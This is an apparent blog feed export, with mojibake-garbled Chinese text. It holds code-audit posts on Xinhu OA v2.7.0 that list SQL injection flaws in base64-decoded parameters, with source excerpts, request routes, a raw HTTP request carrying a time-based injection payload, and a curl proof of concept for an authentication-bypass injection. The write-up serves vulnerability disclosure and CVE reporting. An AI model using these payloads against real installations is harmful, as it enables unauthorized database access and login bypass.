title="å­¦æœ¯ä»·å€¼"></a>å­¦æœ¯ä»·å€¼</h3><ul><li>ğŸ“Š <strong>å®è¯ç ”ç©¶</strong>ï¼šåŸºäºå¤§è§„æ¨¡çœŸå®æ•°æ®çš„å®éªŒéªŒè¯</li><li>ğŸ”¬ <strong>æ–¹æ³•åˆ›æ–°</strong>ï¼šå¤šç»´åº¦çš„æ¨¡å‹è¯„ä¼°æ¡†æ¶</li><li>ğŸ“ˆ <strong>æ€§èƒ½åŸºå‡†</strong>ï¼šä¸ºé¢†åŸŸç ”ç©¶æä¾›æ ‡å‡†å¯¹æ¯”åŸºå‡†</li><li>ğŸ¯ <strong>å®ç”¨æ€§å¼º</strong>ï¼šå¯ç›´æ¥åº”ç”¨äºå®é™…å®‰å…¨é˜²æŠ¤åœºæ™¯</li></ul><hr><p><strong>é¡¹ç›®çŠ¶æ€</strong>ï¼šâœ… å·²å®Œæˆ<br><strong>ä»£ç å¼€æº</strong>ï¼šâœ… å®Œæ•´å¯å¤ç°<br><strong>æ–‡æ¡£å®Œæ•´åº¦</strong>ï¼šâœ… è¯¦ç»†æŠ€æœ¯æ–‡æ¡£<br><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šğŸ“ å­¦æœ¯ç ”ç©¶ | ğŸ¢ å·¥ä¸šåº”ç”¨ | ğŸ”’ ç½‘ç»œå®‰å…¨</p><hr><p><em>æœ¬é¡¹ç›®ä¸ºç ”ç©¶ç”Ÿå­¦ä½è®ºæ–‡çš„é‡è¦ç»„æˆéƒ¨åˆ†ï¼Œå±•ç¤ºäº†æ·±åº¦å­¦ä¹ åœ¨ç½‘ç»œå®‰å…¨é¢†åŸŸçš„å®é™…åº”ç”¨ä»·å€¼å’Œå­¦æœ¯ç ”ç©¶æ„ä¹‰ã€‚</em></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PEæ¶æ„ä»£ç æ£€æµ‹ç³»ç»Ÿ-åŸºäºæ·±åº¦å­¦ä¹ çš„ç ”ç©¶é¡¹ç›®&quot;&gt;&lt;a href=&quot;#PEæ¶æ„ä»£ç æ£€æµ‹ç³»ç»Ÿ-åŸºäºæ·±åº¦å­¦ä¹ çš„ç ”ç©¶é¡¹ç›®&quot; class=&quot;headerlink&quot; title=&quot;PEæ¶æ„ä»£ç æ£€æµ‹ç³»ç»Ÿ - åŸºäºæ·±åº¦å­¦ä¹ çš„ç ”ç©¶é¡¹ç›®&quot;&gt;&lt;/a&gt;PEæ¶æ„ä»£ç æ£€æµ‹ç³»ç»Ÿ - åŸºäºæ·±åº¦å­¦</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ä¿¡å‘¼OA v2.7.0ä»£ç å®¡è®¡+CVEåˆ·å–5ä¸ªæ¼æ´</title>
    <link href="https://250wuyifan.github.io/2025/10/10/%E4%BF%A1%E5%91%BCOA-v2-7-0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>https://250wuyifan.github.io/2025/10/10/%E4%BF%A1%E5%91%BCOA-v2-7-0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
    <published>2025-10-10T08:49:07.000Z</published>
    <updated>2025-10-27T06:19:01.935Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å…¬å¼€æ¼æ´"><a href="#å…¬å¼€æ¼æ´" class="headerlink" title="å…¬å¼€æ¼æ´"></a>å…¬å¼€æ¼æ´</h1><p><a href="https://xz.aliyun.com/news/18609">https://xz.aliyun.com/news/18609</a></p><p><a href="https://xz.aliyun.com/news/18575">https://xz.aliyun.com/news/18575</a></p><p>èœç‹—å¤§ä½¬å…¬å¼€äº†ä¸‰ä¸ªSQLæ¼æ´</p><h1 id="è‡ªè¡Œæ¢ç´¢"><a href="#è‡ªè¡Œæ¢ç´¢" class="headerlink" title="è‡ªè¡Œæ¢ç´¢"></a>è‡ªè¡Œæ¢ç´¢</h1><p>é¦–å…ˆå°±æ˜¯ä»–çš„æ€æƒ³æ˜¯ï¼Œæ‰¾ä¸€äº›è§£å¯†ä¹‹åç›´æ¥æ‹¼æ¥æ•°æ®åº“çš„æ“ä½œï¼Œæˆ‘ä»¬é¦–å…ˆè·Ÿç€è¿™ä¸ªæ€è·¯æ¥ã€‚</p><h2 id="å‰å°SQLæ³¨å…¥1"><a href="#å‰å°SQLæ³¨å…¥1" class="headerlink" title="å‰å°SQLæ³¨å…¥1"></a>å‰å°SQLæ³¨å…¥1</h2><p>èœç‹—å¤§ä½¬åªåˆ†æäº†å‚æ•°â€œshoujiâ€,å¯ä»¥çœ‹åˆ°ä¸‹é¢ä¹Ÿæœ‰ä¸€ä¸ªâ€œuseridå‚æ•°â€æ˜¯ç›´æ¥è§£å¯†ç„¶ååˆ°ä¸‹é¢çš„getoneå‡½æ•°ï¼Œè¿™é‡Œçš„å‰ææ˜¯$barr[â€˜successâ€™]ï¼Œä¹Ÿå°±æ˜¯$urs     &#x3D; m(â€˜adminâ€™)-&gt;getone(â€œ<code>mobile</code>&#x3D;â€™$shoujiâ€™ AND <code>status</code>&#x3D;1â€);è¦æ˜¯æ­£ç¡®çš„æ‰‹æœºå·ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251010165612920.png" alt="image-20251010165612920"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251010165930343.png" alt="image-20251010165930343"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251010170148715.png" alt="image-20251010170148715"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251010170106620.png" alt="image-20251010170106620"></p><p>ä¸å¸¦cookieä¾æ—§ä¹Ÿæ˜¯å¯ä»¥ï¼Œæ‰€ä»¥æ˜¯å‰å°æ³¨å…¥</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251010170252307.png" alt="image-20251010170252307"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /task.php?m=login|api&amp;a=setwxqy&amp;d=task&amp;shouji=MTU4MDAwMDAwMjM=&amp;userid=MSdhbmQgc2xlZXAoMyktLSA=&amp;num=test&amp;agentid=1&amp;callback=test&quot; HTTP/1.1</span><br><span class="line">Host: 192.168.31.23:85</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,zh-TW;q=0.5</span><br><span class="line">Cookie: Hm_lvt_1040d081eea13b44d84a4af639640d51=1759770582; HMACCOUNT=4160D16E28E71D0D; session_user=wgPmpe3hEuJWIL+I+kHtxqag1wutWsMhm6eaAgoJH0c=; Hm_lpvt_1040d081eea13b44d84a4af639640d51=1760018993; PHPSESSID=ulo3i8uqc6539kccfednk4bhcd; deviceid=1760022055661; xinhu_mo_adminid=jy0los0uo0llv0uu0zo0loo0llj0loo0ju0zt0lov0uu0ju0ut0zj05; xinhu_ca_adminuser=admin; xinhu_ca_rempass=0</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="æäº¤äº†5ä¸ªcve"><a href="#æäº¤äº†5ä¸ªcve" class="headerlink" title="æäº¤äº†5ä¸ªcve"></a>æäº¤äº†5ä¸ªcve</h1><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251026234644511.png" alt="image-20251026234644511"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å…¬å¼€æ¼æ´&quot;&gt;&lt;a href=&quot;#å…¬å¼€æ¼æ´&quot; class=&quot;headerlink&quot; title=&quot;å…¬å¼€æ¼æ´&quot;&gt;&lt;/a&gt;å…¬å¼€æ¼æ´&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/news/18609&quot;&gt;https://xz.aliyun.c</summary>
      
    
    
    
    <category term="PHPå®‰å…¨" scheme="https://250wuyifan.github.io/categories/PHP%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="PHPå®‰å…¨" scheme="https://250wuyifan.github.io/tags/PHP%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>å¤ä¹ SQLæ³¨å…¥</title>
    <link href="https://250wuyifan.github.io/2025/10/08/%E5%A4%8D%E4%B9%A0SQL%E6%B3%A8%E5%85%A5/"/>
    <id>https://250wuyifan.github.io/2025/10/08/%E5%A4%8D%E4%B9%A0SQL%E6%B3%A8%E5%85%A5/</id>
    <published>2025-10-07T17:07:50.000Z</published>
    <updated>2025-10-10T09:03:20.216Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ã€æœ€ç»ˆå®Œæ•´ç‰ˆã€‘ä¿¡å‘¼OA-v2-7-0-è§£å¯†SQLæ³¨å…¥æ¼æ´å®¡è®¡æŠ¥å‘Š"><a href="#ã€æœ€ç»ˆå®Œæ•´ç‰ˆã€‘ä¿¡å‘¼OA-v2-7-0-è§£å¯†SQLæ³¨å…¥æ¼æ´å®¡è®¡æŠ¥å‘Š" class="headerlink" title="ã€æœ€ç»ˆå®Œæ•´ç‰ˆã€‘ä¿¡å‘¼OA v2.7.0 - è§£å¯†SQLæ³¨å…¥æ¼æ´å®¡è®¡æŠ¥å‘Š"></a>ã€æœ€ç»ˆå®Œæ•´ç‰ˆã€‘ä¿¡å‘¼OA v2.7.0 - è§£å¯†SQLæ³¨å…¥æ¼æ´å®¡è®¡æŠ¥å‘Š</h1><h2 id="ğŸ“‹-æ‰§è¡Œæ‘˜è¦"><a href="#ğŸ“‹-æ‰§è¡Œæ‘˜è¦" class="headerlink" title="ğŸ“‹ æ‰§è¡Œæ‘˜è¦"></a>ğŸ“‹ æ‰§è¡Œæ‘˜è¦</h2><p><strong>æŒ‰ç…§è§„å¾‹ç³»ç»Ÿæ€§æœç´¢ï¼š<code>base64decode/uncrypt</code> â†’ æ— è¿‡æ»¤ â†’ ç›´æ¥SQLæ‹¼æ¥</strong></p><p>å‘ç° <strong>15ä¸ªçœŸæ­£çš„è§£å¯†å‚æ•°SQLæ³¨å…¥æ¼æ´</strong>ï¼</p><hr><h2 id="ğŸ¯-æ ¸å¿ƒæ¼æ´è§„å¾‹"><a href="#ğŸ¯-æ ¸å¿ƒæ¼æ´è§„å¾‹" class="headerlink" title="ğŸ¯ æ ¸å¿ƒæ¼æ´è§„å¾‹"></a>ğŸ¯ æ ¸å¿ƒæ¼æ´è§„å¾‹</h2><p>ä½ æ•™ä¼šæˆ‘çš„è§„å¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å‚æ•° â†’ decode/uncrypt â†’ âŒ(æ— iconvsql/filterstr/xssrepstr) â†’ SQLæ‹¼æ¥</span><br></pre></td></tr></table></figure><hr><h2 id="ğŸ”¥-å®Œæ•´æ¼æ´åˆ—è¡¨ï¼ˆ15ä¸ªï¼‰"><a href="#ğŸ”¥-å®Œæ•´æ¼æ´åˆ—è¡¨ï¼ˆ15ä¸ªï¼‰" class="headerlink" title="ğŸ”¥ å®Œæ•´æ¼æ´åˆ—è¡¨ï¼ˆ15ä¸ªï¼‰"></a>ğŸ”¥ å®Œæ•´æ¼æ´åˆ—è¡¨ï¼ˆ15ä¸ªï¼‰</h2><h3 id="ã€1ã€‘inputAction-php-getselectdataAjax-ä¸‡èƒ½SQLæ³¨å…¥-â­â­â­â­â­â­"><a href="#ã€1ã€‘inputAction-php-getselectdataAjax-ä¸‡èƒ½SQLæ³¨å…¥-â­â­â­â­â­â­" class="headerlink" title="ã€1ã€‘inputAction.php - getselectdataAjax() - ä¸‡èƒ½SQLæ³¨å…¥ â­â­â­â­â­â­"></a>ã€1ã€‘inputAction.php - getselectdataAjax() - ä¸‡èƒ½SQLæ³¨å…¥ â­â­â­â­â­â­</h3><p><strong>æ–‡ä»¶</strong>: <code>/webmain/flow/input/inputAction.php:782</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getselectdataAjax</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$actstr</span> = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;actstr&#x27;</span>));  <span class="comment">// âš ï¸ è§£å¯†</span></span><br><span class="line">    <span class="variable">$acta</span>   = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$actstr</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">isempt</span>(<span class="variable">$act</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$actstr</span>)&#123;</span><br><span class="line">            <span class="variable">$rows</span> = <span class="title function_ invoke__">c</span>(<span class="string">&#x27;input&#x27;</span>)-&gt;<span class="title function_ invoke__">sqlstore</span>(<span class="variable">$actstr</span>);  <span class="comment">// âš ï¸ æ— è¿‡æ»¤ï¼Œç›´æ¥ä¼ å…¥</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$rows</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>sqlstoreä»£ç </strong>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// inputChajian.php:399</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sqlstore</span>(<span class="params"><span class="variable">$actstr1</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$acta</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$actstr1</span>);</span><br><span class="line">    <span class="variable">$sqla</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$acta</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="variable">$wher</span> = <span class="title function_ invoke__">arrvalue</span>(<span class="variable">$sqla</span>,<span class="number">2</span>,<span class="string">&#x27;1=1&#x27;</span>);</span><br><span class="line">    <span class="variable">$wher</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>, <span class="variable">$wher</span>);  <span class="comment">// âš ï¸ ä»…æ›¿æ¢ $ ä¸º &quot;</span></span><br><span class="line">    <span class="variable">$rowa</span> = <span class="title function_ invoke__">m</span>(<span class="variable">$sqla</span>[<span class="number">0</span>])-&gt;<span class="title function_ invoke__">getall</span>(<span class="variable">$wher</span>,<span class="variable">$sqla</span>[<span class="number">1</span>]);  <span class="comment">// âš ï¸ ç›´æ¥æ‹¼æ¥</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$rowa</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>å±å®³</strong>:</p><ul><li>å¯æ§è¡¨åã€å­—æ®µã€WHEREæ¡ä»¶</li><li><strong>å¯è¯»å–ä»»æ„è¡¨çš„ä»»æ„æ•°æ®</strong></li></ul><p><strong>è·¯ç”±</strong>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php?a=getselectdata&amp;m=input&amp;d=flow&amp;ajaxbool=true&amp;actstr=[base64_payload]</span><br></pre></td></tr></table></figure><hr><h3 id="ã€2ã€‘tableAction-php-savedbupurlAjax-ä»»æ„é…ç½®å†™å…¥-â­â­â­â­"><a href="#ã€2ã€‘tableAction-php-savedbupurlAjax-ä»»æ„é…ç½®å†™å…¥-â­â­â­â­" class="headerlink" title="ã€2ã€‘tableAction.php - savedbupurlAjax() - ä»»æ„é…ç½®å†™å…¥ â­â­â­â­"></a>ã€2ã€‘tableAction.php - savedbupurlAjax() - ä»»æ„é…ç½®å†™å…¥ â­â­â­â­</h3><p><strong>æ–‡ä»¶</strong>: <code>/webmain/system/table/tableAction.php:149</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">savedbupurlAjax</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$dz</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;dz&#x27;</span>);</span><br><span class="line">    <span class="variable">$dz</span> = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$dz</span>);  <span class="comment">// âš ï¸ è§£å¯†</span></span><br><span class="line">    <span class="title function_ invoke__">m</span>(<span class="string">&#x27;option&#x27;</span>)-&gt;<span class="title function_ invoke__">setval</span>(<span class="string">&#x27;dbupurl&#x27;</span>, <span class="variable">$dz</span>);  <span class="comment">// âš ï¸ æ— è¿‡æ»¤ï¼Œç›´æ¥å†™å…¥</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>setvalä»£ç </strong>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// optionModel.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setval</span>(<span class="params"><span class="variable">$num</span>, <span class="variable">$val</span>=<span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span>=<span class="literal">null</span>, <span class="variable">$isub</span>=<span class="literal">true</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$arr</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;num&#x27;</span> =&gt; <span class="variable">$num</span>,</span><br><span class="line">        <span class="string">&#x27;value&#x27;</span> =&gt; <span class="variable">$val</span>,  <span class="comment">// âš ï¸ ç›´æ¥æ’å…¥æ•°æ®åº“</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    );</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">record</span>(<span class="variable">$arr</span>, <span class="variable">$where</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>å±å®³</strong>:</p><ul><li>å¯å†™å…¥ä»»æ„ç³»ç»Ÿé…ç½®</li><li>å¯èƒ½å¯¼è‡´RCEæˆ–æƒé™ç»•è¿‡</li></ul><hr><h3 id="ã€3ã€‘loginAction-php-jinxwqqtbAction-Mobile-SQLæ³¨å…¥-ï¼ˆåˆ†äº«ï¼‰â­â­â­â­â­"><a href="#ã€3ã€‘loginAction-php-jinxwqqtbAction-Mobile-SQLæ³¨å…¥-ï¼ˆåˆ†äº«ï¼‰â­â­â­â­â­" class="headerlink" title="ã€3ã€‘loginAction.php - jinxwqqtbAction() - Mobile SQLæ³¨å…¥ ï¼ˆåˆ†äº«ï¼‰â­â­â­â­â­"></a>ã€3ã€‘loginAction.php - jinxwqqtbAction() - Mobile SQLæ³¨å…¥ ï¼ˆ<strong>åˆ†äº«</strong>ï¼‰â­â­â­â­â­</h3><p><strong>æ–‡ä»¶</strong>: <code>/webmain/task/api/loginAction.php:304</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">jinxwqqtbAction</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">      <span class="variable">$shouji</span>  = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;shouji&#x27;</span>));  <span class="comment">// âš ï¸ è§£å¯†</span></span><br><span class="line">    <span class="variable">$userid</span>  = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;userid&#x27;</span>));  <span class="comment">// âš ï¸ è§£å¯†</span></span><br><span class="line">    <span class="variable">$urs</span>     = <span class="title function_ invoke__">m</span>(<span class="string">&#x27;admin&#x27;</span>)-&gt;<span class="title function_ invoke__">getone</span>(<span class="string">&quot;`mobile`=&#x27;<span class="subst">$shouji</span>&#x27; AND `status`=1&quot;</span>);  <span class="comment">// âš ï¸ ç›´æ¥æ‹¼æ¥</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>å±å®³</strong>:</p><ul><li><code>$shouji</code> å¯æ³¨å…¥SQL</li><li>å¯ä»¥ç»•è¿‡èº«ä»½è®¤è¯</li></ul><p><strong>POC</strong>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shouji=$(<span class="built_in">echo</span> -n <span class="string">&quot;&#x27; OR &#x27;1&#x27;=&#x27;1&quot;</span> | <span class="built_in">base64</span>)</span><br><span class="line">curl <span class="string">&quot;http://target/index.php?a=jinxwqqtb&amp;m=login&amp;d=api&amp;ajaxbool=true&amp;shouji=<span class="variable">$&#123;shouji&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure><hr><h3 id="ã€4ã€‘loginAction-php-yzmAction-Mobile-SQLæ³¨å…¥2-â­â­â­â­â­"><a href="#ã€4ã€‘loginAction-php-yzmAction-Mobile-SQLæ³¨å…¥2-â­â­â­â­â­" class="headerlink" title="ã€4ã€‘loginAction.php - yzmAction() - Mobile SQLæ³¨å…¥2 â­â­â­â­â­"></a>ã€4ã€‘loginAction.php - yzmAction() - Mobile SQLæ³¨å…¥2 â­â­â­â­â­</h3><p><strong>æ–‡ä»¶</strong>: <code>/webmain/task/api/loginAction.php:263</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">yzmAction</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$mobile</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;mobile&#x27;</span>);</span><br><span class="line">    <span class="variable">$mobile</span> = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$mobile</span>);  <span class="comment">// âš ï¸ è§£å¯†</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">c</span>(<span class="string">&#x27;check&#x27;</span>)-&gt;<span class="title function_ invoke__">iscnmobile</span>(<span class="variable">$mobile</span>))<span class="keyword">return</span> <span class="title function_ invoke__">returnerror</span>(<span class="string">&#x27;err2&#x27;</span>);</span><br><span class="line">    <span class="variable">$where</span>  = <span class="string">&quot;`mobile`=&#x27;<span class="subst">$mobile</span>&#x27;&quot;</span>;  <span class="comment">// âš ï¸ ç›´æ¥æ‹¼æ¥</span></span><br><span class="line">    <span class="comment">// ... m(&#x27;admin&#x27;)-&gt;getone($where)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="ã€5ã€‘goodsModel-php-getpage-Keyword-LIKEæ³¨å…¥-â­â­â­â­"><a href="#ã€5ã€‘goodsModel-php-getpage-Keyword-LIKEæ³¨å…¥-â­â­â­â­" class="headerlink" title="ã€5ã€‘goodsModel.php - getpage() - Keyword LIKEæ³¨å…¥ â­â­â­â­"></a>ã€5ã€‘goodsModel.php - getpage() - Keyword LIKEæ³¨å…¥ â­â­â­â­</h3><p><strong>æ–‡ä»¶</strong>: <code>/webmain/model/goodsModel.php:123</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getpage</span>(<span class="params"><span class="variable">$where</span>=<span class="string">&#x27;1=1&#x27;</span>,<span class="variable">$fields</span>=<span class="string">&#x27;*&#x27;</span>,<span class="variable">$order</span>=<span class="string">&#x27;sort&#x27;</span>,<span class="variable">$lx</span>=<span class="number">0</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span>  = <span class="variable language_">$this</span>-&gt;rock-&gt;<span class="title function_ invoke__">post</span>(<span class="string">&#x27;key&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">isempt</span>(<span class="variable">$key</span>))&#123;</span><br><span class="line">        <span class="variable">$key</span>= <span class="variable language_">$this</span>-&gt;rock-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$key</span>);  <span class="comment">// âš ï¸ è§£å¯†</span></span><br><span class="line">        <span class="variable">$where</span>.= <span class="string">&quot; and (a.`name` like &#x27;%<span class="subst">$key</span>%&#x27; or a.`num` like &#x27;%<span class="subst">$key</span>%&#x27; or a.`xinghao` like &#x27;%<span class="subst">$key</span>%&#x27; or a.`guige` like &#x27;%<span class="subst">$key</span>%&#x27;)&quot;</span>;  <span class="comment">// âš ï¸ ç›´æ¥æ‹¼æ¥</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>å±å®³</strong>: å¯ä»¥åœ¨LIKEä¸­æ³¨å…¥ï¼š<code>%&#39; UNION SELECT ...--</code></p><hr><h3 id="ã€6-7ã€‘crmModel-php-getclientselect-getclientpage-LIKEæ³¨å…¥-â­â­â­â­"><a href="#ã€6-7ã€‘crmModel-php-getclientselect-getclientpage-LIKEæ³¨å…¥-â­â­â­â­" class="headerlink" title="ã€6-7ã€‘crmModel.php - getclientselect() &#x2F; getclientpage() - LIKEæ³¨å…¥ â­â­â­â­"></a>ã€6-7ã€‘crmModel.php - getclientselect() &#x2F; getclientpage() - LIKEæ³¨å…¥ â­â­â­â­</h3><p><strong>æ–‡ä»¶</strong>: <code>/webmain/model/crmModel.php:17,41</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ç¬¬17è¡Œ</span></span><br><span class="line"><span class="variable">$key</span>= <span class="variable language_">$this</span>-&gt;rock-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$key</span>);  <span class="comment">// âš ï¸ è§£å¯†</span></span><br><span class="line"><span class="variable">$where</span>.= <span class="string">&quot; and (`name` like &#x27;%<span class="subst">$key</span>%&#x27; or `unitname` like &#x27;%<span class="subst">$key</span>%&#x27;)&quot;</span>;  <span class="comment">// âš ï¸ æ‹¼æ¥</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ç¬¬41è¡Œ</span></span><br><span class="line"><span class="variable">$key</span>= <span class="variable language_">$this</span>-&gt;rock-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$key</span>);  <span class="comment">// âš ï¸ è§£å¯†</span></span><br><span class="line"><span class="variable">$where</span>.= <span class="string">&quot; and (`name` like &#x27;%<span class="subst">$key</span>%&#x27; or `unitname` like &#x27;%<span class="subst">$key</span>%&#x27;)&quot;</span>;  <span class="comment">// âš ï¸ 